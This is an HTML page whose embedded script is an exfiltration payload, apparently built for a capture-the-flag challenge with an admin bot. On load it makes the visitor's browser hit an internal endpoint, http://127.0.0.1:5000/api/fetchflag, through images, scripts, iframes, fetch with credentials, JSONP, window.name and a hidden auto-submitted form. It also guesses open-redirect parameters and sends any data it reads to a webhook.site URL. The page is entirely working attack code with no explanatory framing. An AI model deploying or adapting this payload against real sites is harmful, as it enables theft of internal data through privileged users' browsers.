<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>collector</title>
</head>
<body>
<h2>collector — aggressive exfil page</h2>
<p>Watching for exfil to webhook</p>
<script>
(async function(){
  // webhook you control
  const WH = "https://webhook.site/6cd5ca68-6f38-4b62-ac03-db4442d880d6";

  // internal target we want the admin to hit
  const internal = "http://127.0.0.1:5000/api/fetchflag";

  // Small helper: create an image pointing at a URL (blind GET)
  function imgGet(url){ try { const i = new Image(); i.src = url + (url.includes('?')? '&' : '?') + 'r=' + Math.random(); } catch(e){} }

  // 1) Blind GET via <img>
  imgGet(internal + "?via=img");

  // 2) Script tag (if internal returns JS or JSONP)
  try {
    const s = document.createElement('script');
    s.src = internal + "?via=script";
    document.body.appendChild(s);
  } catch(e){}

  // 3) Hidden iframe to cause the request in the browser
  try {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    f.src = internal;
    document.body.appendChild(f);
  } catch(e){}

  // 4) no-cors fetch to fire the request (opaque) - then signal to webhook that we fired it
  try {
    fetch(internal, { mode: 'no-cors', credentials: 'include' }).then(() => {
      imgGet(WH + "?note=fired_no_cors");
    }).catch(()=>{ imgGet(WH + "?note=no_cors_err"); });
  } catch(e){ imgGet(WH + "?note=no_cors_exc"); }

  // 5) Try CORS fetch (may fail to read) but try to exfiltrate what we can
  try {
    fetch(internal, { mode: 'cors', credentials: 'include' }).then(r => r.text()).then(text => {
      // Attempt to send what we read to webhook via multiple channels
      navigator.sendBeacon(WH + "?flag=" + encodeURIComponent(text));
      imgGet(WH + "?flag=" + encodeURIComponent(text));
      // fallback POST (may be blocked by CORS but try)
      fetch(WH, { method: 'POST', body: text }).catch(()=>{});
    }).catch(()=>{ imgGet(WH + "?note=cors_failed"); });
  } catch(e){ imgGet(WH + "?note=cors_exc"); }

  // 6) Try common redirect/reflection parameter names pointing to your webhook
  const redirectGuesses = [
    "/?next=",
    "/?redirect=",
    "/?url=",
    "/redirect?url=",
    "/login?next=",
    "/logout?next=",
    "/callback?next=",
    "/returnTo="
  ];
  for (const g of redirectGuesses) {
    imgGet("http://127.0.0.1:5000" + g + encodeURIComponent(WH + "?via=redir"));
  }

  // 7) Try JSONP-like param names (callback) — if internal supports JSONP it may call our global cb
  window.__collect_callback = function(payload){
    try {
      navigator.sendBeacon(WH + "?flag=" + encodeURIComponent(JSON.stringify(payload)));
      imgGet(WH + "?flag=" + encodeURIComponent(JSON.stringify(payload)));
    } catch(e){}
  };
  try {
    const cbScript = document.createElement('script');
    cbScript.src = internal + "?callback=__collect_callback";
    document.body.appendChild(cbScript);
  } catch(e){}

  // 8) Attempt window.name transport (rarely works unless server sets window.name)
  try {
    const transportIframe = document.createElement('iframe');
    transportIframe.style.display = 'none';
    // load the internal page first
    transportIframe.src = internal + "?via=wn";
    document.body.appendChild(transportIframe);

    // after a short delay, navigate iframe to a same-origin page we control (the GitHub page)
    setTimeout(() => {
      try {
        transportIframe.src = window.location.origin + "/wn_collect.html";
        // after it loads, read transportIframe.contentWindow.name (if internal page set it)
        setTimeout(() => {
          try {
            const val = transportIframe.contentWindow && transportIframe.contentWindow.name;
            if (val) {
              imgGet(WH + "?flag=" + encodeURIComponent(val));
            }
          } catch(e){
            imgGet(WH + "?note=wn_read_err");
          }
        }, 2000);
      } catch(e){
        imgGet(WH + "?note=wn_nav_err");
      }
    }, 2000);
  } catch(e){ imgGet(WH + "?note=wn_exc"); }

  // 9) Fallback: attempt to POST a form to internal (some endpoints accept form input)
  try {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = "http://127.0.0.1:5000/visit"; // example writable endpoint
    form.style.display = 'none';
    const i1 = document.createElement('input'); i1.name='url'; i1.value='http://example.invalid';
    const i2 = document.createElement('input'); i2.name='visitor'; i2.value='botpage';
    form.appendChild(i1); form.appendChild(i2);
    document.body.appendChild(form);
    form.submit();
  } catch(e){}

  // Final signal we loaded
  imgGet(WH + "?note=page_loaded");
})();
</script>
</body>
</html>
